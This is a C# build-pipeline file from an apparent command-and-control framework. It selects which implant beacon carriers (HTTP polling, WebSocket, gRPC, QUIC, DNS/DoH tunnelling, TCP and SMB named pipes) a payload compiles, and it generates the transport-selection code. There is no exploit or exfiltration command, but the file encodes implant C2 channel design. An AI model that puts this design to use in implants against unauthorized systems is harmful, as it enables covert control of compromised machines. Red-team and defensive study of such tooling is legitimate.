namespace Rod.BuildPipeline.PayloadBuild;

/// <summary>
/// The check-in mode wire values a build profile bakes (the same strings the
/// implant's Config normalizes): "stream" holds a connection open, "poll"
/// cycles. The web URL shape splits by it -- stream dials the WebSocket
/// beacon, poll runs the envelope POST cycle.
/// </summary>
public static class CheckInModes
{
    public const string Stream = "stream";
    public const string Poll = "poll";
}

/// <summary>
/// The check-in modules a build compiles in (architecture.md Sec 8): one
/// flag per implant-side client the bake-time trim can include.
/// </summary>
[Flags]
public enum CheckInModules
{
    None = 0,

    /// <summary>
    /// The envelope POST cycle client (the implant's EnvelopeBeacon): serves
    /// walk entries whose beacon URL is a schemed http(s) front on a
    /// poll-mode bake.
    /// </summary>
    Web = 1,

    /// <summary>
    /// The mTLS gRPC stream client (the implant's Beacon): serves walk
    /// entries whose beacon URL is a bare host:port.
    /// </summary>
    Stream = 2,

    /// <summary>
    /// The WebSocket stream client (the implant's WsBeacon): serves walk
    /// entries whose beacon URL is a schemed http(s) front on a stream-mode
    /// bake -- the web posture's interactive tier.
    /// </summary>
    WebSocket = 4,

    /// <summary>
    /// The QUIC stream client (the implant's QuicBeacon): serves walk entries
    /// whose beacon URL is quic-schemed -- the duplex socket family's live
    /// session, whatever the baked mode.
    /// </summary>
    Quic = 8,

    /// <summary>
    /// The DNS check-in client (the implant's DnsCheckIn): serves walk
    /// entries whose beacon URL is dns-schemed -- the egress-restricted
    /// TXT carrier, poll-only (the parser refuses a stream-mode naming
    /// with the fix, the same rule the socket family applies).
    /// </summary>
    Dns = 16,

    /// <summary>
    /// The socket check-in client (the implant's SocketBeacon): serves walk
    /// entries whose beacon URL is tcp- or smb-schemed -- the named-pipe and
    /// raw-socket poll carriers, one connection one check-in, the interactive
    /// verbs on the shared store-and-forward carriage.
    /// </summary>
    Socket = 32,
}

/// <summary>
/// One check-in module's bake-time descriptor: everything the trim needs to
/// know about a carrier's implant-side client -- which module flag it is,
/// which source files carry it in the implant tree, which beacon URL shapes
/// (and mode) it serves, and the factory line the generated transport
/// selection names. A carrier arriving later registers a descriptor here
/// instead of editing switches; the same shape is the seam an out-of-tree
/// carrier contributes through (its provider on the server side, its module
/// descriptor and sources on the implant side).
/// </summary>
public sealed record CheckInModuleDescriptor(
    CheckInModules Module,
    string[] Files,
    Func<string, string, bool> Serves,
    string FactoryLine);

/// <summary>
/// The registered check-in modules. Matching order is load-bearing: the
/// shapes are disjoint except the stream descriptor's bare host:port
/// fallthrough, which must sit last so a schemed or quic or dns entry never
/// falls into it.
/// </summary>
public static class CheckInModuleRegistry
{
    private static readonly CheckInModuleDescriptor[] Descriptors =
    {
        new(
            CheckInModules.Web,
            ["Internal/EnvelopeBeacon.cs", "Internal/WebCheckIn.cs"],
            (url, mode) => IsWebBeaconUrl(url) && mode != CheckInModes.Stream,
            "        WebCheckIn.Create(setup),"),
        new(
            CheckInModules.WebSocket,
            ["Internal/WsBeacon.cs"],
            (url, mode) => IsWebBeaconUrl(url) && mode == CheckInModes.Stream,
            "        WsCheckIn.Create(setup),"),
        new(
            CheckInModules.Quic,
            ["Internal/QuicCheckIn.cs", "Internal/QuicEnroll.cs"],
            (url, _) => IsQuicBeaconUrl(url),
            "        QuicCheckIn.Create(setup),"),
        new(
            CheckInModules.Dns,
            ["Internal/DnsCheckIn.cs", "Internal/DnsEnroll.cs"],
            (url, _) => IsDnsBeaconUrl(url),
            "        DnsCheckIn.Create(setup),"),
        new(
            CheckInModules.Socket,
            ["Internal/SocketCheckIn.cs", "Internal/SocketEnroll.cs"],
            (url, _) => IsSocketBeaconUrl(url),
            "        SocketCheckIn.Create(setup),"),
        new(
            CheckInModules.Stream,
            ["Internal/Beacon.cs", "Internal/StreamCheckIn.cs"],
            (_, _) => true,
            "        StreamCheckIn.Create(setup),"),
    };

    public static IReadOnlyList<CheckInModuleDescriptor> All => Descriptors;

    // Whether an enroll entry's URL needs the QUIC module: the QUIC enroll
    // exchange (architecture.md Sec 8) rides the module's dial, so a
    // quic-schemed enroll endpoint claims it even when a named beacon split
    // points the session at another front. The http(s) enroll client always
    // compiles, so no other enroll shape claims a module.
    public static bool EnrollsOverQuic(string enrollUrl) => IsQuicBeaconUrl(enrollUrl);

    // The socket enroll exchange rides the socket module's dial the same
    // way (Sec 8, enrollment over the stream check-in): a tcp- or
    // smb-schemed enroll endpoint claims the module whatever the session's
    // front names.
    public static bool EnrollsOverSocket(string enrollUrl) => IsSocketBeaconUrl(enrollUrl);

    // The DNS enroll exchange rides the DNS module's dial too (Sec 8,
    // enrollment over DNS): a dns- or doh-schemed enroll endpoint claims it.
    public static bool EnrollsOverDns(string enrollUrl) => IsDnsBeaconUrl(enrollUrl);

    // The implant's BeaconUrl.IsWeb, mirrored: a beacon URL naming a web
    // front (a schemed http(s) URL) carries the envelope POST cycle or the
    // WebSocket beacon by the baked mode. Kept in textual lockstep with the
    // implant's predicate -- the wire-side test pins both.
    private static bool IsWebBeaconUrl(string beaconUrl)
        => beaconUrl.Trim().StartsWith("http://", StringComparison.OrdinalIgnoreCase)
           || beaconUrl.Trim().StartsWith("https://", StringComparison.OrdinalIgnoreCase);

    // The implant's BeaconUrl.IsQuic, mirrored: a quic-schemed beacon URL is
    // the QUIC stream's dial shape. Kept in textual lockstep with the
    // implant's predicate -- the wire-side test pins both.
    private static bool IsQuicBeaconUrl(string beaconUrl)
        => beaconUrl.Trim().StartsWith("quic://", StringComparison.OrdinalIgnoreCase);

    // The implant's BeaconUrl.IsDns, mirrored: a dns- or doh-schemed beacon
    // URL is the DNS carrier's dial shape (a resolver and a zone, or a bare
    // zone for the system resolver; DoH is the same grammar over HTTPS).
    // Kept in textual lockstep with the implant's predicate -- the
    // wire-side test pins both.
    private static bool IsDnsBeaconUrl(string beaconUrl)
    {
        var trimmed = beaconUrl.Trim();
        return trimmed.StartsWith("dns://", StringComparison.OrdinalIgnoreCase)
               || trimmed.StartsWith("doh://", StringComparison.OrdinalIgnoreCase);
    }

    // The implant's BeaconUrl.IsSocket, mirrored: a tcp-schemed beacon URL
    // is the raw socket's dial, an smb-schemed one the named pipe's
    // (smb://host/pipe/name). Kept in textual lockstep with the implant's
    // predicate -- the wire-side test pins both.
    private static bool IsSocketBeaconUrl(string beaconUrl)
    {
        var trimmed = beaconUrl.Trim();
        return trimmed.StartsWith("tcp://", StringComparison.OrdinalIgnoreCase)
               || trimmed.StartsWith("smb://", StringComparison.OrdinalIgnoreCase);
    }
}

/// <summary>
/// The bake-time transport trim (architecture.md Sec 6, Sec 8): selects
/// which check-in modules an implant-class build compiles and rewrites the
/// staging copy accordingly. The selection walks the registry's descriptors
/// per egress entry -- the first descriptor whose shape (and mode) serves
/// the URL claims it -- applied to the primary and each fallback, so the
/// compiled set is precisely the set of shapes the artifact can dial and
/// never smaller.
/// </summary>
/// <remarks>
/// The trim is whole source files: the unselected modules' files leave the
/// staging copy's compilation, and a generated selection file replaces the
/// checked-in TransportSelection stub naming only the compiled factories --
/// the same replace-a-stub generation BakedProfile.cs and the extension
/// registrations use. The gRPC generation rides along through the implant
/// csproj's RodGrpcServices switch (message types only when no stream module
/// compiles), which also drops the Grpc.Net.Client reference: a web-shaped
/// artifact links no gRPC client code at all, and a stream-shaped one keeps
/// the full client. The stager tree is never trimmed: it fetches over plain
/// HTTP and carries no check-in clients.
/// </remarks>
public static class TransportModuleSelection
{
    /// <summary>
    /// Selects the check-in modules a profile's baked egress walk needs: the
    /// primary entry's beacon URL (the named beacon endpoint, else the one
    /// derived from the enroll endpoint -- the same value
    /// <c>RenderBakedProfile</c> bakes as <c>beaconURL</c>) plus each
    /// fallback's derived URL, each claimed by the first registry descriptor
    /// that serves its shape (and mode). A walk that can cross shapes (a
    /// stream primary with web fallbacks) keeps every client it can dial, so
    /// no bake ever strands the artifact on an entry it cannot run.
    /// </summary>
    /// <remarks>
    /// The enroll entries claim a module too, but only the QUIC one: the
    /// HTTP enroll client always compiles (C2 is untrimmed), while the QUIC
    /// enroll exchange rides the QUIC module's dial, so a quic-schemed
    /// enroll entry needs the module even when a named beacon split points
    /// the session at another front.
    /// </remarks>
    public static CheckInModules Select(TransportProfile profile, string mode)
    {
        var modules = CheckInModules.None;
        Consider(profile.BeaconEndpoint ?? DotNetBuildUnit.BeaconUrlFromEnroll(profile.Endpoint));
        foreach (var fallback in profile.FallbackEndpoints)
            Consider(DotNetBuildUnit.BeaconUrlFromEnroll(fallback));
        ClaimEnroll(profile.Endpoint);
        foreach (var fallback in profile.FallbackEndpoints)
            ClaimEnroll(fallback);
        return modules;

        void Consider(string beaconUrl)
        {
            foreach (var descriptor in CheckInModuleRegistry.All)
            {
                if (!descriptor.Serves(beaconUrl, mode))
                    continue;
                modules |= descriptor.Module;
                return;
            }
        }

        // The enroll entries claim a module when the exchange rides the
        // module's own dial (QUIC, the socket family); the http(s) enroll
        // client always compiles, so it claims nothing.
        void ClaimEnroll(string enrollUrl)
        {
            if (CheckInModuleRegistry.EnrollsOverQuic(enrollUrl))
                modules |= CheckInModules.Quic;
            if (CheckInModuleRegistry.EnrollsOverSocket(enrollUrl))
                modules |= CheckInModules.Socket;
            if (CheckInModuleRegistry.EnrollsOverDns(enrollUrl))
                modules |= CheckInModules.Dns;
        }
    }

    /// <summary>
    /// Whether the compilation needs the generated gRPC client (and with it
    /// the Grpc.Net.Client reference): only a walk with a stream-shaped
    /// entry dials one.
    /// </summary>
    public static bool NeedsGrpcClient(CheckInModules modules)
        => (modules & CheckInModules.Stream) != 0;

    /// <summary>
    /// Rewrites the staging copy of the implant tree to carry exactly the
    /// selected modules: each unselected descriptor's source files are
    /// deleted whole, and the generated TransportSelection replaces the
    /// checked-in stub naming only the compiled factories. A set of
    /// <see cref="CheckInModules.None"/> is refused -- a primary entry always
    /// exists, so an empty set means the caller, not the profile, is wrong.
    /// </summary>
    public static void Apply(string stagingDir, CheckInModules modules)
    {
        if (modules == CheckInModules.None)
            throw new InvalidOperationException(
                "A build must compile at least one check-in module; the egress walk's primary entry always has a shape.");

        foreach (var descriptor in CheckInModuleRegistry.All)
        {
            if ((modules & descriptor.Module) != 0)
                continue;
            foreach (var file in descriptor.Files)
                File.Delete(Path.Combine(stagingDir, file));
        }

        File.WriteAllText(Path.Combine(stagingDir, SelectionFile), RenderSelection(modules));
    }

    // The generated selection replaces this checked-in stub, relative to the
    // implant tree root. The stub names every module so the dev tree runs
    // against any URL shape.
    private const string SelectionFile = "Internal/TransportSelection.cs";

    // Renders the per-build TransportSelection: same shape as the checked-in
    // stub, naming only the compiled factories in registry order. The
    // implant's Program hands this array to its check-in coordinator, which
    // picks per URL shape and mode at run time -- with one module compiled
    // the pick is constant, with several (a shape-crossing walk) it follows
    // the walk exactly as the dev tree does. The enroll dispatch names a
    // module's branch only when the module compiled -- the http branch (C2)
    // is always compiled, so the member always exists for the Program to
    // call.
    private static string RenderSelection(CheckInModules modules)
    {
        var factories = new List<string>();
        foreach (var descriptor in CheckInModuleRegistry.All)
            if ((modules & descriptor.Module) != 0)
                factories.Add(descriptor.FactoryLine);
        var enrollChain = "await C2.EnrollAsync(dial, cancellationToken)";
        if ((modules & CheckInModules.Dns) != 0)
            enrollChain =
                "BeaconUrl.IsDns(dial.EnrollUrl)\n"
                + "                    ? await DnsEnroll.EnrollAsync(dial, cancellationToken)\n"
                + "                    : " + enrollChain;
        if ((modules & CheckInModules.Socket) != 0)
            enrollChain =
                "BeaconUrl.IsSocket(dial.EnrollUrl)\n"
                + "                ? await SocketEnroll.EnrollAsync(dial, cancellationToken)\n"
                + "                : " + enrollChain;
        if ((modules & CheckInModules.Quic) != 0)
            enrollChain =
                "BeaconUrl.IsQuic(dial.EnrollUrl)\n"
                + "            ? await QuicEnroll.EnrollAsync(dial, cancellationToken)\n"
                + "            : " + enrollChain;
        return
            "// <auto-generated> Generated by Rod.DotNetBuildUnit at build time.\n"
            + "// The check-in modules this artifact compiles (architecture.md Sec 8),\n"
            + "// selected from the baked egress walk's URL shapes.\n"
            + "namespace Rod.Implant.Internal;\n\n"
            + "internal static class TransportSelection\n"
            + "{\n"
            + "    public static ICheckInClient[] CreateClients(CheckInSetup setup) =>\n"
            + "    [\n"
            + string.Join("\n", factories) + "\n"
            + "    ];\n\n"
            + "    public static async Task<Enrollment> EnrollAsync(EnrollDial dial, CancellationToken cancellationToken = default) =>\n"
            + "        " + enrollChain + ";\n"
            + "}\n";
    }
}
